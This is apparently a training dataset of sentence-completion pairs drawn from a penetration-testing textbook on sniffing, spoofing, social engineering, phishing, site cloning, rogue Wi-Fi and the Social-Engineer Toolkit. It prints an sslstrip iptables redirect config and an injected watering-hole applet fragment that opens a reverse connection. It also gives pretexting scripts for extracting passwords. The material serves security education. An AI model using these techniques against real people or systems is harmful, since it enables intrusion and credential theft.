"sslstrip is a plug-in to ettercap , so it can","sslstrip is a plug-in to ettercap , so it can be enabled just as the dns spoofing plug-in was enabled"
sslstrip needs to know what firewall command is being used,sslstrip needs to know what firewall command is being used so it can set up a redirect in the firewall
"they need to be uncommented if you are using iptables ,","they need to be uncommented if you are using iptables , which is more likely than ipchains , which is the other option"
conf # if you use iptables : redir_command_on = `` iptables -t nat -a prerouting -i % iface -p tcp -- dport % port -j redirect -- to-port % rport '' redir_command_off =,"conf # if you use iptables : redir_command_on = `` iptables -t nat -a prerouting -i % iface -p tcp -- dport % port -j redirect -- to-port % rport '' redir_command_off = `` iptables -t nat -d prerouting -i % iface -p tcp -- dport % port -j redirect -- to-port % rport '' once that ’ s done , the sslstrip plug-in can be enabled"
"again , though , this assumes that the https connection is using","again , though , this assumes that the https connection is using a version of ssl or tls that is vulnerable to the stripping attack"
summary sniffing can be an important skill to have because of the,summary sniffing can be an important skill to have because of the many tactics that can rely on information that can be gathered from sniffing
"sniffing is another word for capturing packets , which is the process of gathering all messages that pass by the network interface , grabbing","sniffing is another word for capturing packets , which is the process of gathering all messages that pass by the network interface , grabbing them at the data link layer , and passing all the messages up to an application that is capable of displaying the messages captured"
"while it ’ s called packet capturing , it ’ s really frames that are being grabbed","while it ’ s called packet capturing , it ’ s really frames that are being grabbed since the data is being grabbed at the data link layer with the layer 2 headers intact"
if the packet-capture software is discarding the layer 2,"if the packet-capture software is discarding the layer 2 informa-tion , then it really is a packet capture"
it is generally available across multiple operating,"it is generally available across multiple operating systems , but especially unix-like operating systems"
"the behavior is the same , but the source code is different in","the behavior is the same , but the source code is different in order to take into account the way windows interacts with its network hardware"
if you are looking for a program you can use with,"if you are looking for a program you can use with the same name across multiple platforms , you can use tshark"
"there may be other programs and utilities you can use to analyze packet captures ,","there may be other programs and utilities you can use to analyze packet captures , but wireshark has to be about the best you can get , especially for the money"
it will call attention to those issues by coloring the frames in,it will call attention to those issues by coloring the frames in the packet capture and also coloring the lines in the protocol decode
"this is sometimes called port spanning because ,","this is sometimes called port spanning because , as mentioned previously , cisco calls the functionality span"
arp spoofing is when a system sends gratuitous arp responses,"arp spoofing is when a system sends gratuitous arp responses , which are then cached on other systems on the network"
"however , you can also use arp spoofing as a starting point to do dns","however , you can also use arp spoofing as a starting point to do dns spoofing if what you really want to do is redirect requests to other ip addresses"
"the program that does all this is ettercap ,","the program that does all this is ettercap , though there are other programs that can do arp spoofing"
this may be done by intercepting dns requests and,this may be done by intercepting dns requests and responding to them faster than the legitimate dns server
"in the case of dns , first to answer wins , and sometimes dns clients will accept answers even from ip addresses that don","in the case of dns , first to answer wins , and sometimes dns clients will accept answers even from ip addresses that don ’ t originate the request because dns servers may sometimes respond on a different ip address than the one the response came in on"
"] , seq 915235445:915235528 , ack 3437317287 , win 2048 , options [","] , seq 915235445:915235528 , ack 3437317287 , win 2048 , options [ nop , nop , ts val 1310611430 ecr 1794010423 ] , length 83 a"
which functionality in wireshark will provide you with percentages for every,"which functionality in wireshark will provide you with percentages for every protocol in the packet capture , ordered by protocol layers ? a"
26 tcp 1464 443 → 61618 [ ack ] seq=4361 ack=1276 win=31232,26 tcp 1464 443 → 61618 [ ack ] seq=4361 ack=1276 win=31232 len=1398 tsval=3725556941 tsecr=1266252437 [ tcp segment of a reassembled pdu ] a
"ultimately , social engi-neering attacks are going to be very effective","ultimately , social engi-neering attacks are going to be very effective avenues into a network so you can continue to perform testing"
"this would be especially true when it comes to red teaming , where you are likely to","this would be especially true when it comes to red teaming , where you are likely to have the cuffs taken off , as it were , and you have more latitude in your tactics"
you may be familiar with some basic social engineering strategies,"you may be familiar with some basic social engineering strategies like phishing , simply because it ’ s so common"
"ultimately , any means of manipulating someone to do something they","ultimately , any means of manipulating someone to do something they shouldn ’ t or wouldn ’ t otherwise do is social engineering"
social engi-neering brings in a lot of psychology and elements of human,"social engi-neering brings in a lot of psychology and elements of human nature , so essentially you are using the way people are against them"
"beyond the basics of social engineering , including how and why it","beyond the basics of social engineering , including how and why it works , there is also social engineering outside of the virtual world"
"in the digital space , there is phishing , of course ,","in the digital space , there is phishing , of course , but even phishing can make use of other elements , including rogue websites"
"rogue websites may be used even without the phishing component , and they are called rogue because either","rogue websites may be used even without the phishing component , and they are called rogue because either they are controlled by an attacker or there may be malware installed by an attacker within a legitimate website"
"creating rogue networks , as well as other aspects of social engineering","creating rogue networks , as well as other aspects of social engineering , can be automated to take the time out of setting them up"
"social engineering social engineering , regardless of what it was called or how it","social engineering social engineering , regardless of what it was called or how it was thought of , has been around probably as long as humans have been around"
"you may call it manipulation if you like , but in","you may call it manipulation if you like , but in the information security community , it ’ s called social engineering"
the objec-tive is to convince or manipulate someone into doing something they,the objec-tive is to convince or manipulate someone into doing something they wouldn ’ t normally do for someone they don ’ t know
"if you get one of these free samples , you may","if you get one of these free samples , you may be inclined to feel like you should buy the product in response"
"commitment if someone commits to something , either in writing or","commitment if someone commits to something , either in writing or orally , they are more inclined to follow through on that commitment"
"if you see someone else doing something , such as using a","if you see someone else doing something , such as using a product , you will see that it is acceptable to do that"
"think about cabbage patch kids , if you go back that","think about cabbage patch kids , if you go back that far , and also many of the product rollouts by apple"
if you were to see your neighbor eating something and then not,"if you were to see your neighbor eating something and then not dying , you would be more inclined to eat that thing yourself"
"if your neighbor does something for you , you would","if your neighbor does something for you , you would do something for them because that is how communities work"
"essentially , these are deep-seated modes of behaving","essentially , these are deep-seated modes of behaving because of the way our brains and neurochemistry work"
we are wired to be susceptible to social engineering and scams because from an,"we are wired to be susceptible to social engineering and scams because from an evolution-ary standpoint , we needed one another to survive , so trust is important"
this means the attacker is trying to get someone,this means the attacker is trying to get someone to provide information they shouldn ’ t be providing
"i love you made use of a vulnerability in an email client , allowing","i love you made use of a vulnerability in an email client , allowing the virus to use the address book to send messages to all the contacts"
"before the virus could run , though , someone had to be convinced to","before the virus could run , though , someone had to be convinced to open the email and then run the script that was contained in the message"
1 i love you virus there are so many examples of social,"1 i love you virus there are so many examples of social engineering , and you probably see many on a reg- ular basis"
"when it comes to social engineering , though , it ’ s probably best to be prepared","when it comes to social engineering , though , it ’ s probably best to be prepared and think about your situation and not expect to just fly by the seat of your pants"
"pretexting a pretext is an excuse to do something or say something , and in the","pretexting a pretext is an excuse to do something or say something , and in the context of social engi-neering , a pretext is the story you have generated to explain the contact"
"it ’ s where you would be spending a fair amount of time , so you","it ’ s where you would be spending a fair amount of time , so you need to have a clear understanding of how best to get what you are looking for"
you start with what it is you are looking to get from,"you start with what it is you are looking to get from your victims , since that will be the basis of your story"
"for instance , if you are looking for someone ’ s corporate credentials","for instance , if you are looking for someone ’ s corporate credentials , you wouldn ’ t call them saying you were from their bank"
once you have an understanding of what it is you,"once you have an understanding of what it is you are looking for , you can start to create your scenario"
"while this was supposedly a legitimate contact , here ’ s","while this was supposedly a legitimate contact , here ’ s an example of a way to get some- one to engage"
"though i hung up at that point , it ’ s likely it was a call to ask for donations to","though i hung up at that point , it ’ s likely it was a call to ask for donations to some charity like the police officers foundation , as the approach is similar to ones i ’ ve received from them"
rather than stumbling when i said there was no one,"rather than stumbling when i said there was no one here by that name , he had an answer without hesitation"
if you have told them you will follow through by,"if you have told them you will follow through by giving money to their cause , you will likely follow through"
"if you are trying to get someone to give up their information , doing them a","if you are trying to get someone to give up their information , doing them a favor or at least appearing to do them a favor can make them feel indebted to you"
"you may call , for instance , saying you are from the company ’ s help desk","you may call , for instance , saying you are from the company ’ s help desk and you noticed a lot of bogus attempts to log in to your target ’ s account"
you were concerned about them and their per-sonal information since credit card theft is so,"you were concerned about them and their per-sonal information since credit card theft is so prevalent , not to mention any other data that may be stored on their system"
"if you are looking for some good stories about how to work a social engi- neering attack ,","if you are looking for some good stories about how to work a social engi- neering attack , find some of the stories by kevin mitnick , who has long been considered a master of social engineering"
the story about you being arrested unless you arrange a payment to cover,the story about you being arrested unless you arrange a payment to cover costs or fines or whatever they use as their pretext is completely bogus
"similarly , when you receive email from fedex or american express or chase","similarly , when you receive email from fedex or american express or chase or any other legitimate company , the email isn ’ t just plain text"
"because it looks correct and because they are likely offering up something you want , they expect you will ignore the actual","because it looks correct and because they are likely offering up something you want , they expect you will ignore the actual url ( since it ’ s hidden by the email client anyway , as a general rule ) and click the link"
"this is also referred to as the nigerian prince scam ,","this is also referred to as the nigerian prince scam , and the 419 refers to the section of the nigerian criminal code"
"this scam is similar to a scam from the 18th century , which is a","this scam is similar to a scam from the 18th century , which is a reminder of how long social engineering has been used to manipulate people for criminal purposes"
"the important thing , if you want to be success-ful ,","the important thing , if you want to be success-ful , is to get your pretexting done so you have your story together"
this will allow you to be able to handle any,this will allow you to be able to handle any situation that may arise if you are actually talking to someone
"social engineering vectors once you start factoring in all the different pretexts you could use ,","social engineering vectors once you start factoring in all the different pretexts you could use , there are countless ways to get to someone and whatever you are looking to get from them"
"however , when it comes down to it , there","however , when it comes down to it , there are really four vectors that are used for social engineering"
they are as follows : phishing the word phishing is based on the idea,"they are as follows : phishing the word phishing is based on the idea of fishing , meaning you are dangling some sort of bait out to get information"
"decades ago , the term phreak was used to talk","decades ago , the term phreak was used to talk about someone who was proficient at manipulating the phone network"
phishing is a technique used to,phishing is a technique used to acquire information through deception using electronic communications
"in this case , it ’ s considered to be more of a physical vector , where","in this case , it ’ s considered to be more of a physical vector , where you are trying to gain access to a building or facility by pretending to be someone else"
impersonation attacks can also be through websites in that users believe,impersonation attacks can also be through websites in that users believe they are visiting one site when in fact they are visiting another
"most of them are based on means of com- munication , but one of them","most of them are based on means of com- munication , but one of them is based on a primarily physical mechanism—pretending to be someone or something you aren ’ t"
"in cases where password policies are onerous , they don ’ t take into account how hard remembering passwords can be ,","in cases where password policies are onerous , they don ’ t take into account how hard remembering passwords can be , and some users will simply be incapable of keeping track of their passwords and resort to writing them down to remind them"
the badge will generally have a radio frequency identification (,the badge will generally have a radio frequency identification ( rfid ) device that can be read by badge readers
the reader is con-nected to a system that can check whether,"the reader is con-nected to a system that can check whether your rfid device , and by extension you , has been authorized"
"if your card has been authorized , the reader sends a signal","if your card has been authorized , the reader sends a signal to unlock or release the door—a fairly simple process that is widely used"
"2 rfid-based badge there are problems with this approach , though , meaning you","2 rfid-based badge there are problems with this approach , though , meaning you can bypass these door- locking devices to allow you to gain access to a building"
"if you wait around an entry door , especially about the time employees would commonly be going","if you wait around an entry door , especially about the time employees would commonly be going into the building , you could wait until someone else ran their badge and unlocked the door"
"if they are allowing multiple people through the outside door , though , there is a good chance you","if they are allowing multiple people through the outside door , though , there is a good chance you could still just use the tailgate option again to whatever part of the building you needed to get access to"
"however , you will find employees who are reluctant to","however , you will find employees who are reluctant to challenge someone else to see if they have a badge"
"some companies may suggest you allow the tailgating and then call physical security to deal with it , under the premise that if someone is trying","some companies may suggest you allow the tailgating and then call physical security to deal with it , under the premise that if someone is trying to gain access to the building for malicious purposes , they may put the employee ’ s physical safety in danger if the employee challenges their access"
"there are different combinations of active and passive interaction between the tag and the reader ,","there are different combinations of active and passive interaction between the tag and the reader , but ultimately , they work on radio frequency waves operating in the 125 khz or 13"
"in order to clone one , all you need to do is read the identifi er off the badge or","in order to clone one , all you need to do is read the identifi er off the badge or device you want to clone and replicate it into the new badge , card , or other device you are using"
it also may be possible to clone a device using,it also may be possible to clone a device using the near-fi eld communication ( nfc ) technology in your phone
"in fact , some hotels are starting to make use of","in fact , some hotels are starting to make use of that technology to allow you to use your phone to unlock doors"
"while this isn ’ t necessarily a very expensive endeavor , it may be easier to","while this isn ’ t necessarily a very expensive endeavor , it may be easier to simply get your hands on someone ’ s card to make use of it for a while"
"one advantage to this is that even though photos are generally on these badges , though not always , most people","one advantage to this is that even though photos are generally on these badges , though not always , most people won ’ t notice a photo , nor will they ask to see the badge close enough to look at it"
it ’ s also very easy to walk around with the,it ’ s also very easy to walk around with the badge turned around so there is no name or photo showing
"obviously , with no name and no photo , how would anyone challenge the use of this particular badge , as long","obviously , with no name and no photo , how would anyone challenge the use of this particular badge , as long as it granted access to the building ? sometimes , you will find there is a guard inside the badge access doors"
"the guard should be checking for tailgating and also , ideally","the guard should be checking for tailgating and also , ideally , visually inspecting entrants to see that they have their badges"
"people are people , however , and it can be very easy to slip","people are people , however , and it can be very easy to slip through a group of people unless the guard is forc-ing individual inspection of the badge"
you just walk through as though you belong there and,you just walk through as though you belong there and assume the guard won ’ t notice your lack of badge
man traps a man trap is a device that will,man traps a man trap is a device that will make it considerably harder to gain entrance to a build-ing
the second door would likely be operated by a guard who may perform some sort of authentication check like verifying,the second door would likely be operated by a guard who may perform some sort of authentication check like verifying your identity against the name and photo on the badge that may have allowed you into the space to begin with
this may be an area where badge cloning may be of some help,"this may be an area where badge cloning may be of some help , unless the guard is checking your badge against another form of identification"
there are other ways of doing something similar—only allowing,there are other ways of doing something similar—only allowing a single person through a doorway at one time
you may find cases where there is a turnstile or revolving door,you may find cases where there is a turnstile or revolving door that restricts access based on badge access or another form of authentication
"once it registered that you were there , it would allow","once it registered that you were there , it would allow for a partial revolution , just enough to allow someone through"
"since you may mistime stepping into the door , you may need to swipe your badge","since you may mistime stepping into the door , you may need to swipe your badge multiple times , which means that a double swipe is common enough that it ’ s allowed"
"if you hap-pened to have an accomplice within the company , they could swipe","if you hap-pened to have an accomplice within the company , they could swipe you in and then swipe themselves in as soon as the door had discharged you"
you probably won ’ t have someone on the inside to,"you probably won ’ t have someone on the inside to let you in , though , which means finding another way around"
"obviously , a door so restrictive as to not allow more than one person in at a time ( and often barely","obviously , a door so restrictive as to not allow more than one person in at a time ( and often barely admits a person with a backpack on ) wouldn ’ t allow someone on crutches and certainly not someone in a wheelchair"
"it was easy to swipe in using the handicapped door , and it would stay open for a good amount","it was easy to swipe in using the handicapped door , and it would stay open for a good amount of time before auto-closing , to ensure that anyone dis - abled in some way had time to get through"
"honestly , we used the handicap entrance to get to our cars in the parking garage when","honestly , we used the handicap entrance to get to our cars in the parking garage when we went to lunch with vendors so they didn ’ t have to go back through the lobby"
"interestingly , these revolving doors can operate as a sort of man trap in the sense that even if you were to gain access in some way to the building without","interestingly , these revolving doors can operate as a sort of man trap in the sense that even if you were to gain access in some way to the building without having a badge , you would be stuck in the building because in order to get out , you ’ d need to swipe your badge again to operate the door"
"you would swipe , then step on the pad , and the door would","you would swipe , then step on the pad , and the door would rotate just a quarter turn , enough to let you out on the other side"
"recently , apple introduced face id , which is meant to be better at live","recently , apple introduced face id , which is meant to be better at live facial recognition because the device can ’ t be fooled by something simple like a photo"
"fingerprints fingerprint scanners are common , in part because","fingerprints fingerprint scanners are common , in part because the technology for them has been around for a while"
"there are some issues with fingerprints , including the fact that the reader could be fooled","there are some issues with fingerprints , including the fact that the reader could be fooled by a high resolution replica of the print , unless the reader takes into account body temperature"
body temperature isn ’ t always a reliable indicator since it isn ’ t,body temperature isn ’ t always a reliable indicator since it isn ’ t guaranteed to be consistent ( ever run across someone with really cold hands ? )
"if you look very closely at your eye or , perhaps better , someone else","if you look very closely at your eye or , perhaps better , someone else ’ s eye , you will see that the iris isn ’ t a solid color"
one advantage of iris scanning is that light is used to,"one advantage of iris scanning is that light is used to illuminate the eye , so iris scanning could work in the dark"
the retina is at the very back of your eye and,the retina is at the very back of your eye and contains the light-sensitive cells that create impulses for your optic nerve
one of them is that your voice will change from day to,"one of them is that your voice will change from day to day based on a number of factors , including simply time of day"
this is one reason there aren ’ t a lot of systems that,"this is one reason there aren ’ t a lot of systems that will use voiceprint , at least for the implementation of a security system"
"there may be ways to bypass the different types of bio-metrics , but it may simply","there may be ways to bypass the different types of bio-metrics , but it may simply be easier to not even get into a situation where the biometrics scans come into play"
phone calls this isn ’ t exactly physical in the way that gaining access to,"phone calls this isn ’ t exactly physical in the way that gaining access to a facility is , but it still can be a lucrative way to collect information"
it ’ s also useful to have done a lot of reconnaissance,it ’ s also useful to have done a lot of reconnaissance ahead of time so you know more than just the main phone number
attackers can just start randomly calling phone numbers or extensions within an,"attackers can just start randomly calling phone numbers or extensions within an orga- nization , saying they are from the help desk or it support"
"this is especially true of unsophisticated users , who are probably more prone to needing","this is especially true of unsophisticated users , who are probably more prone to needing help desk support and may potentially be challenged per-forming the actions needed , even when guided"
"this could make them especially grateful for a callback , most","this could make them especially grateful for a callback , most particularly if you are able to make their problem go away"
if you were to suggest you needed a username and password to,"if you were to suggest you needed a username and password to authenticate them , they may be willing to give that information up"
"companies regularly put employees through training , typically","companies regularly put employees through training , typically annually , to help them recognize social engineering scams"
it helps even more if you have details about the company that you can feed people on the,"it helps even more if you have details about the company that you can feed people on the inside to make it seem more like you really do work for the company , making you more trustworthy"
"if you ’ ve ever been to an it-related conference or convention , you may have noticed the long lines of people waiting","if you ’ ve ever been to an it-related conference or convention , you may have noticed the long lines of people waiting to grab whatever companies are giving away , regardless of whether they need it or not , or whether it ’ s useful"
"after all , how many stress toys can you possibly have","after all , how many stress toys can you possibly have ? why is this relevant ? you can take advantage of this"
anything that would encourage someone to grab the disc and put,anything that would encourage someone to grab the disc and put it into their computer to see what was really on it
"of course , often computers today don ’ t have cd-rom drives in","of course , often computers today don ’ t have cd-rom drives in them , so leaving cds around doesn ’ t do a lot of good"
"if you were to see a 128 gb usb stick sitting in the parking lot , for instance , what would you do ? even something smaller , what would","if you were to see a 128 gb usb stick sitting in the parking lot , for instance , what would you do ? even something smaller , what would you do ? a fairly substantial number would look around to see if there were anyone nearby who may have dropped it , and then they would pick it up"
a lot of people will insert the stick into their computer to either see,a lot of people will insert the stick into their computer to either see what ’ s on it or format it so they can use it themselves
who couldn ’ t use a 128 gb usb stick for transporting data or,"who couldn ’ t use a 128 gb usb stick for transporting data or backing up data ? of course , not just any usb stick will do"
inf file to have your program run automatically if the stick,inf file to have your program run automatically if the stick is inserted into a com - puter that has autorun enabled
it ’ s a common hardening technique to,it ’ s a common hardening technique to prevent any removable disk from automatically running anything
"again , though , you may be able to get people to ignore their","again , though , you may be able to get people to ignore their training if you make the bait you have left behind especially tantalizing in some way"
"these days , really large usb sticks don ’ t cost a lot of money","these days , really large usb sticks don ’ t cost a lot of money , so it may be a good investment to get some that you can leave around"
you ’ ve probably seen them a lot if you are a security professional or,you ’ ve probably seen them a lot if you are a security professional or even if you are just someone who has been using a computer for a few years
if you don ’ t feel like you ’ ve seen,"if you don ’ t feel like you ’ ve seen a phishing attack , open your junk folder in your email program"
"after all , if i was selected , why don ’ t they already have my information ? another one","after all , if i was selected , why don ’ t they already have my information ? another one that raises a huge flag for me is the suggestion that i should contact a barrister in the united states"
better phishing emails are those that are constructed to look completely,"better phishing emails are those that are constructed to look completely legitimate , as long as you aren ’ t looking too closely"
"these sorts of attacks are more likely to succeed ,","these sorts of attacks are more likely to succeed , and they aren ’ t especially difficult to put together"
"interestingly , there is a second link in the message where","interestingly , there is a second link in the message where the url is only seen if you hover over the link"
"it also has nothing to do with wells fargo , but strangely","it also has nothing to do with wells fargo , but strangely , it is also different from the url that you can see"
"odds are , if the urls even work , they will lead to","odds are , if the urls even work , they will lead to a site that either asks for authentication information or supplies malware to the system"
"it ’ s very lucrative , as you can tell by the","it ’ s very lucrative , as you can tell by the number of email messages you may have in your junk email folder"
my email address has been around long enough and is just well known enough ( not because of me but because of,my email address has been around long enough and is just well known enough ( not because of me but because of what the address itself is ) that i likely have more than enough in just the last month for both of us
"if you are targeting people who work for a particular company , you have moved beyond phishing and gone to spear phishing ,","if you are targeting people who work for a particular company , you have moved beyond phishing and gone to spear phishing , which means you aren ’ t using a shotgun approach trying to hit as many targets across a broad area as you can"
"5 , it ’ s likely the attachment was a pdf but","5 , it ’ s likely the attachment was a pdf but the attachment was stripped out by anti-malware software on the server side"
that may be more complicated than you want because it would rely on either the,that may be more complicated than you want because it would rely on either the user opening an attachment or the attachment taking advantage of a vulnerability in the system
"if you are phishing as your entry point , you may start with a site clone , which","if you are phishing as your entry point , you may start with a site clone , which would look like a legitimate site so when the user connects , they don ’ t suspect anything"
"com , which may let people think they are connecting to microsoft ’ s site when","com , which may let people think they are connecting to microsoft ’ s site when in fact they are connecting to the host identified by the hostname in the domain rogue"
users don ’ t always see the entire hostname or url and prob-ably don ’ t understand enough,users don ’ t always see the entire hostname or url and prob-ably don ’ t understand enough about the structure of fully qualified domain names ( fqdns ) to understand what they are looking at
"ulti-mately , you don ’ t want to arouse suspicions , so you","ulti-mately , you don ’ t want to arouse suspicions , so you are better off doing as much as you can to make something appear legitimate"
"if anyone were paying attention , they would see the","if anyone were paying attention , they would see the requests going to the legiti-mate sites rather than your rogue site"
the only file that would be coming from your rogue,the only file that would be coming from your rogue site is the html that controls the rendering of the page
"you could also use winhttrack to test sites rather than downloading them , which","you could also use winhttrack to test sites rather than downloading them , which means you could check a list of bookmarks to see if they were still valid"
"on a linux system , you could grab tarballs of source code ,","on a linux system , you could grab tarballs of source code , package files , or any file that wouldn ’ t need to be rendered"
you can use wget to do recursive get requests to a web,"you can use wget to do recursive get requests to a web server , which is what you would need to mirror a site"
it then looks for all the anchor tags in the page and,it then looks for all the anchor tags in the page and follows each of them in turn to get those pages or files
"in the following code listing , you can see a run of wget using","in the following code listing , you can see a run of wget using -m to tell wget to mirror the site , meaning grab the entire site"
7 site cloning with winhttrack using wget to mirror website root @ quiche,7 site cloning with winhttrack using wget to mirror website root @ quiche : ~ # wget -m url -- 2018-11-21 07:05:43 -- url resolving www
301 moved permanentlylocation : /en-us [ following ] --,301 moved permanentlylocation : /en-us [ following ] -- 2018-11-21 07:05:43 -- url reusing existing connection to www
-kb/s in 0s if you wanted to have access to the site,"-kb/s in 0s if you wanted to have access to the site offline , you could use command-line switches to make the links relative"
"for our purposes , though , we would want to have the site available through our own web","for our purposes , though , we would want to have the site available through our own web server , so we ’ re just going to mirror the site , keeping everything the way it is"
"unfortunately , curl doesn ’ t have built-in functionality to pull","unfortunately , curl doesn ’ t have built-in functionality to pull a complete website , in spite of everything curl is capable of"
"you could , though , write a short script that would pull the site ,","you could , though , write a short script that would pull the site , and there are such scripts available online for people who prefer to use curl over wget"
"once you have the pages for the site in place ,","once you have the pages for the site in place , you would need to make any adjustments to the source code"
this would include inserting your malicious code so it could be down-loaded and,this would include inserting your malicious code so it could be down-loaded and then including a reference to it in one of the pages in the site
rogue attacks a rogue website would be one that a user may,rogue attacks a rogue website would be one that a user may expect to be legitimate when in fact it has a malicious purpose
"this could be a site that looks exactly like a legitimate site , using the site-cloning technique mentioned","this could be a site that looks exactly like a legitimate site , using the site-cloning technique mentioned earlier , but the url , meaning the fully qualified domain name , is different than the usual url"
attackers can register these common typos as domain names,attackers can register these common typos as domain names them - selves and wait for people to come visit
it could mean that you are using a legitimate platform,it could mean that you are using a legitimate platform to stage your attack without the legitimate platform knowing anything
a watering hole attack is a social engineering attack that makes use,a watering hole attack is a social engineering attack that makes use of the fact that there are sites that people will commonly visit
"because it ’ s a place animals are guaranteed to come , because water is so essential to life and not all animals","because it ’ s a place animals are guaranteed to come , because water is so essential to life and not all animals get all the water they need from their food , the watering hole is a great place to wait for ani-mals to visit"
"with a watering hole attack , you would gain access to a","with a watering hole attack , you would gain access to a website that a lot of people visit and introduce infected software to it"
"rather than just gaining access to a single system , if you compromise a website that ’ s visited a lot by the","rather than just gaining access to a single system , if you compromise a website that ’ s visited a lot by the people you are looking to get information out of , you can gain access to a lot of systems by compromising a single system"
once you get over the hurdle of compro - mising,"once you get over the hurdle of compro - mising the website—for example , if you were to compromise espn"
com you would get a lot of men in particular,com you would get a lot of men in particular stopping by on a regular basis—introducing the attack is easy
"as an example , in the following code listing you can","as an example , in the following code listing you can see a couple of lines introduced at the bottom of an index"
jar '' > < param name= '' name '' > < param name= '' 1 '' value= '' url krmnair '' > < param name= '' 2 '' value= '' zgf0yq== '' > < param name= '',"jar '' > < param name= '' name '' > < param name= '' 1 '' value= '' url krmnair '' > < param name= '' 2 '' value= '' zgf0yq== '' > < param name= '' 3 '' value= '' url > < param name= '' 4 '' value= '' url > this does require that you have an applet that you can use , though they can either be found or created"
this html fragment tells the browser to load the java,this html fragment tells the browser to load the java class found in the java archive ( jar ) hkfkikkhsvshss
included in this attack is a reverse connection back,included in this attack is a reverse connection back to an ip address that was loaded into the attack
watering hole attacks are not the only web-based attacks you ’,"watering hole attacks are not the only web-based attacks you ’ ll see , but they have the advantage of being targeted"
"you could load up an attack into the intranet server , if the company has one , since it ’ s the","you could load up an attack into the intranet server , if the company has one , since it ’ s the sort of site employees will regularly visit , and you could potentially gather a lot of desktop systems from the compromised host"
"wireless social engineering wi-fi networks have become ubiquitous , and with so many devices not even having the capability of","wireless social engineering wi-fi networks have become ubiquitous , and with so many devices not even having the capability of supporting a wired connection , there is generally an expectation that there would be a wi-fi network available for people"
"just sitting in my living room , in a small community","just sitting in my living room , in a small community , there is a list of almost two dozen wi-fi networks available"
"8 list of wi-fi networks you can take advantage of this lack of any way to know what network to use ,","8 list of wi-fi networks you can take advantage of this lack of any way to know what network to use , since even if you check the base service set identifier ( bssid ) , you can ’ t tell anything from it"
"you can easily create a rogue wi-fi network , which pro-vides a lot","you can easily create a rogue wi-fi network , which pro-vides a lot of interesting possibilities , especially when it comes to gathering usernames and passwords"
wireless networks were initially thought to be inferior to physical networks because,wireless networks were initially thought to be inferior to physical networks because it was so easy to gather the signals out of the air
as a way to protect the transmissions from capture,"as a way to protect the transmissions from capture , there have been multiple attempts at encrypting the transmissions"
the follow-on to that was wi-fi protected access ( wpa ),"the follow-on to that was wi-fi protected access ( wpa ) , which attempted to correct some of the issues with wep"
this means wpa and wpa2 could accept usernames and passwords,this means wpa and wpa2 could accept usernames and passwords for authentication before being allowed to connect to the network
"generally , a username and password used in a wire-less network at a company would be the same username and password used","generally , a username and password used in a wire-less network at a company would be the same username and password used to authenticate against the network servers , since those servers , for instance active directory servers , gen-erally handle authentication for the enterprise"
"in some cases , you would just connect to a wi-fi","in some cases , you would just connect to a wi-fi network and it would bring up some- thing called a captive portal"
a captive portal is basically a limited functionality web,a captive portal is basically a limited functionality web page that often provides edit boxes for authentication credentials
"at a hotel , you may be expected to log in with loyalty credentials or you may have","at a hotel , you may be expected to log in with loyalty credentials or you may have to provide your last name and room number as a way to prove you are really a hotel customer"
"the program hostapd turns your wireless interface into an access point , and iptables","the program hostapd turns your wireless interface into an access point , and iptables is used to route traffic from your wireless interface through another interface to the internet"
"this is a program that will do a lot of the work for you ,","this is a program that will do a lot of the work for you , including creating a scenario that would allow you to install software onto the target system"
"rather than passing everything in on the command line , it ’ s just as easy to run","rather than passing everything in on the command line , it ’ s just as easy to run it without any command-line parameters and then make your selections as the program walks you through your choices"
"starting it up , you can see it sets up a pair of wireless interfaces ; then it starts up a dynamic host configuration protocol ( dhcp","starting it up , you can see it sets up a pair of wireless interfaces ; then it starts up a dynamic host configuration protocol ( dhcp ) server and iptables , both of which would be needed to make it seem as though users had legitimately con - nected to an access point"
"as it says on the screen , you arrow down to select","as it says on the screen , you arrow down to select the ssid you want to spoof and then press enter to select it"
you may have noticed in the preced-ing output that one of,you may have noticed in the preced-ing output that one of the wireless interfaces was going to be used for the deauthentication attack
"this means that as wifiphisher runs , it will send deauthentication frames","this means that as wifiphisher runs , it will send deauthentication frames to systems that appear to be connected to the real access point"
9 wifiphisher ssid selection once you have selected the ssid you plan to,"9 wifiphisher ssid selection once you have selected the ssid you plan to spoof , wifiphisher will ask you to select the type of attack to use"
10 wifiphisher attack template selection the template selected,10 wifiphisher attack template selection the template selected will determine what you get from your target
"the oauth page will allow you to gather credentials , while other templates , including","the oauth page will allow you to gather credentials , while other templates , including the browser plug-in , will allow you to get some code onto the target computer"
"as with so many other things , it comes down to what","as with so many other things , it comes down to what you are trying to accom - plish with this type of attack"
"when it comes to wireless , there are so many moving pieces needed to make it work effectively , meaning the whole setup would work in a way that","when it comes to wireless , there are so many moving pieces needed to make it work effectively , meaning the whole setup would work in a way that it wouldn ’ t cause much suspicion on the part of the user , which may prevent them from getting a security team involved to identify your rogue access point"
"this is not to say , though , that you","this is not to say , though , that you need to always use manual methods for other social engineering attacks"
"we ’ re going to turn to metasploit to help us with this , but more specifically , we","we ’ re going to turn to metasploit to help us with this , but more specifically , we ’ ll use a program that is an overlay on top of metasploit called the social-engineer toolkit ( set )"
this is a menu-based program that uses modules and functionality from metasploit but pulls,this is a menu-based program that uses modules and functionality from metasploit but pulls it all together automatically for you to accomplish tasks necessary for social engineering attacks
"this is a program that has a lot of capability , but we ’ re going to","this is a program that has a lot of capability , but we ’ re going to limit our look at it rather than doing a very deep dive into everything it can do"
this is certainly true in the number of vec-tors available in the,"this is certainly true in the number of vec-tors available in the social-engineering attacks menu , which you can see in the following listing"
"no matter which one you pick , you will be able","no matter which one you pick , you will be able to send to either a single address or mul- tiple addresses"
spear-phishing vector 1 ) perform a mass email attack 2 ) create,spear-phishing vector 1 ) perform a mass email attack 2 ) create a fileformat payload 3 ) create a social-engineering template mass mailer vector 1
e-mail attack mass mailer we ’ re going to take a look at the mass,e-mail attack mass mailer we ’ re going to take a look at the mass email attack vector because the essentials will be the same across the different email attacks
geticon buffer overflow 12 ) adobe jbig2decode memory corruption exploit 13,geticon buffer overflow 12 ) adobe jbig2decode memory corruption exploit 13 ) adobe pdf embedded exe social engineering 14 ) adobe util
printf ( ) buffer overflow 15 ) custom exe to vba ( sent via rar ) ( rar required ) 16 ),printf ( ) buffer overflow 15 ) custom exe to vba ( sent via rar ) ( rar required ) 16 ) adobe u3d clodprogressivemeshdeclaration array overrun 17 ) adobe pdf embedded exe social engineering ( nojs ) 18 ) foxit pdf reader v4
1 title stack buffer overflow 19 ) apple quicktime,1 title stack buffer overflow 19 ) apple quicktime pict pnsize buffer overflow 20 ) nuance pdf reader v6
